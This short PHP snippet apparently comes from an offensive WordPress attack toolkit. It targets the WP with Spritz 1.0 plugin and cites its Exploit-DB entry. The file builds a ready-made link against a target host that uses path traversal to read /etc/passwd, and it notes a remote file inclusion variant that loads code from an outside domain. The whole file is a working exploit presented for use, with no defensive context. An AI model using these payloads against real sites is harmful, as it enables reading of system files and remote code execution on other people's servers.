<?php   echo "<h3>🐱‍💻 WordPress Plugin WP with Spritz 1.0 🐱‍💻 Local File Inclusion 🐱‍💻</h3>";
  echo "<p><a href=\"https://www.exploit-db.com/exploits/44544/\">https://www.exploit-db.com/exploits/44544/</a></p>";
  echo "<p><a href=\"http://".$url."/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd\">http://".$url."/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd</a></p>";
  echo "<p>💀 RFI!!! /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec</p>";
 ?>
